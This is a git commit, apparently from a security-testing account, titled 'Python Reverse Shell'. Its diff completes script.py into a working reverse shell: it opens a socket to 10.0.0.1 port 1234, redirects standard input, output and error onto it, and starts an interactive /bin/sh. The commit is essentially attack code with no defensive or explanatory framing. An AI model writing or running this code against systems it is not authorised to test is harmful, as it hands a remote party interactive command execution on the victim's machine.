ef365a99a87c671b9022d0271847e1863a1b708d
ncisectest <60100279+ncisectest@users.noreply.github.com>
2020-02-07 21:45:49 +0000

    Python Reverse Shell

--- script.py
+++ script.py
@@ -2,8 +2,13 @@
 
 import subprocess
 import os
+import socket
 
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.1", 1234))
+
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+p = subprocess.call(["/bin/sh", "-i"])
